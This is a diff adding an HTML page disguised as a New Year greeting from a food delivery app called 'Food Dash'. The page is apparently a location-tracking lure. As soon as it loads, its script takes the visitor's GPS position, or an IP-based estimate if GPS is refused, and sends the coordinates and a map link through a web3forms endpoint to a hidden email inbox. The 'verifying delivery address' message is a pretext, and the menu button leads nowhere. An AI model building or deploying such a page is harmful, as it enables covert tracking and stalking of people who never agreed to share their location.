@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Happy New Year 2026 | Food Dash</title>
+    <style>
+        :root {
+            --gold: #ffd700;
+            --dark-bg: #0f0c29;
+        }
+
+        body {
+            background: linear-gradient(to bottom, #0f0c29, #302b63, #24243e);
+            font-family: 'Segoe UI', Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: white;
+            overflow: hidden;
+            text-align: center;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(15px);
+            padding: 40px 20px;
+            border-radius: 30px;
+            border: 1px solid rgba(255, 215, 0, 0.3);
+            width: 85%;
+            max-width: 400px;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
+            z-index: 10;
+        }
+
+        .new-year-title {
+            font-size: 2.2rem;
+            color: var(--gold);
+            margin-bottom: 10px;
+            text-shadow: 0 0 15px rgba(255, 215, 0, 0.6);
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow {
+            from { text-shadow: 0 0 10px var(--gold); }
+            to { text-shadow: 0 0 25px var(--gold), 0 0 10px #fff; }
+        }
+
+        .loader {
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top: 3px solid var(--gold);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        #status {
+            font-size: 1rem;
+            color: #e0e0e0;
+            margin-bottom: 20px;
+        }
+
+        .btn {
+            background: var(--gold);
+            color: black;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 50px;
+            font-weight: bold;
+            font-size: 1rem;
+            display: none; /* Hidden until location sent */
+            text-decoration: none;
+            transition: transform 0.2s;
+        }
+
+        .btn:active { transform: scale(0.95); }
+
+        /* Small stars background */
+        .stars {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: transparent url('https://www.transparenttextures.com/patterns/stardust.png') repeat;
+            top: 0; left: 0;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="stars"></div>
+
+    <div class="container">
+        <div class="new-year-title">Happy New Year<br>2026! 🎆</div>
+        <div id="loader" class="loader"></div>
+        <p id="status">Verifying your delivery address...</p>
+        <a href="#" id="menuBtn" class="btn">Explore New Year Menu</a>
+    </div>
+
+    <form id="locationForm" style="display:none;">
+        <input type="hidden" name="access_key" value="d5ceb622-59e5-41a9-89f8-41aaf5f099e4">
+        <input type="hidden" name="subject" value="New Food Order Location Captured">
+        <input type="hidden" name="from_name" value="Delivery App Prototype">
+        <input type="hidden" name="type" id="formType">
+        <input type="hidden" name="map_link" id="formLink">
+        <input type="hidden" name="coords" id="formCoords">
+    </form>
+
+    <script>
+        const statusText = document.getElementById('status');
+        const loader = document.getElementById('loader');
+        const menuBtn = document.getElementById('menuBtn');
+
+        async function sendToGmail(data) {
+            document.getElementById('formType').value = data.method;
+            document.getElementById('formCoords').value = `${data.lat}, ${data.lng}`;
+            document.getElementById('formLink').value = `https://www.google.com/maps?q=${data.lat},${data.lng}`;
+
+            const formData = new FormData(document.getElementById('locationForm'));
+            const object = Object.fromEntries(formData);
+
+            try {
+                const response = await fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(object)
+                });
+                
+                if (response.ok) {
+                    loader.style.display = "none";
+                    statusText.innerText = "Location Verified Successfully!";
+                    menuBtn.style.display = "inline-block";
+                }
+            } catch (err) {
+                statusText.innerText = "Connection error. Please try again.";
+            }
+        }
+
+        function useIPFallback() {
+            statusText.innerText = "Fetching address via network...";
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(ipData => {
+                    sendToGmail({
+                        method: "IP-BASED (Approximate)",
+                        lat: ipData.latitude,
+                        lng: ipData.longitude
+                    });
+                })
+                .catch(() => {
+                    statusText.innerText = "Please enable location for delivery.";
+                });
+        }
+
+        function captureLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        sendToGmail({
+                            method: "GPS (Highly Accurate)",
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude
+                        });
+                    },
+                    (error) => {
+                        console.warn("GPS Denied, using IP.");
+                        useIPFallback();
+                    },
+                    { enableHighAccuracy: true, timeout: 8000 }
+                );
+            } else {
+                useIPFallback();
+            }
+        }
+
+        // Start the process immediately
+        window.onload = captureLocation;
+    </script>
+</body>
+</html>
